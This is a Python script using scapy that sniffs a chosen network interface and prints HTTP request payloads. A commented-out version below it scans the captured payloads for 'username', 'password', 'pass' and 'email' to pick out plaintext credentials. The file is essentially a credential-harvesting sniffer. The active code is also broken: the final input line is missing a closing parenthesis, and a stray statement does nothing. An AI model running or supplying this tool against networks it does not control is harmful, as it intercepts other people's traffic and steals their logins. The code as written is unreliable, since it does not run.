from scapy.layers.http import HTTPRequest 
import scapy.all as scapy


def packet_sniffer_func(interface):
    scapy.sniff(iface=interface, store=False, prn=sniff_and)

def sniff_and(packet):
    packet
    if packet.haslayer(HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet.show())
while True:
    packet_sniffer_func(str(input("> Enter A Interface Name to select:"))




















# import scapy.all as scapy
# import argparse
# from scapy.layers import http
# def get_interface():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
#     arguments = parser.parse_args()
#     return arguments.interface

# def sniff(iface):
#     scapy.sniff(iface=iface, store=False, prn=process_packet)

# def process_packet(packet):
#     if packet.haslayer(http.HTTPRequest):
#         print("[+] Http Request >> " + str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path))
#         if packet.haslayer(scapy.Raw):
#             load = str(packet[scapy.Raw].load)
#             keys = ["username", "password", "pass", "email"]
#             print(load)
#             for key in keys:
#                 if key in load:
#                     print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
#                     break

# iface = "eth0"
# sniff(iface)
